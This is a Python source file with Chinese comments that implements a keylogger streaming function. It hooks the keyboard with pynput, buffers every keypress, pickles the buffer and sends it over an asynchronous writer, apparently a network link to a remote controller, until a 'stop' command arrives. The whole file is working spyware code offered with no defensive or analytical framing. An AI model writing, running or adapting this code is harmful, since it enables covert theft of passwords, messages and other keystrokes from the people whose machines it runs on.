import asyncio
from pynput import keyboard
import pickle
import struct
import logging


# 发送键盘输入流的函数
async def start_keylogger_stream(writer, reader):
    try:
        # 存储按键数据的缓冲区
        key_buffer = []
        # 定义按键事件回调
        def on_press(key):
            try:
                # 记录按键
                key_buffer.append(str(key.char) if hasattr(key, 'char') else str(key))
            except AttributeError:
                # 如果按键没有 'char' 属性，记录为按键名
                key_buffer.append(str(key))
        # 使用 async loop 来运行 listener
        listener = keyboard.Listener(on_press=on_press)
        # 将阻塞的 listener 运行在事件循环的执行器中
        listener.start()
        # 监听并发送按键数据
        while True:
            if key_buffer:
                # 序列化按键数据
                data = pickle.dumps(key_buffer)
                size = struct.pack('L', len(data))  # 获取数据大小
                writer.write(b"\1")
                await writer.drain()
                # 发送数据大小
                writer.write(size)
                await writer.drain()
                # 发送序列化的按键数据
                writer.write(data)
                await writer.drain()
                # 清空缓冲区
                key_buffer.clear()
            else:
                writer.write(b"\2")
                await writer.drain()
            # 检查是否收到停止信号
            response = await reader.read(1024)
            response = response.decode()  # 解码成字符串
            logging.debug(f"Received response: {response}")
            if response == "stop":
                logging.info("Stopping keylogger...")
                listener.stop()  # 停止监听器
                break
    except Exception as e:
        logging.error(f"[!] Error during keylogger stream: {e}")
    finally:
        logging.info("Keylogger stopped.")
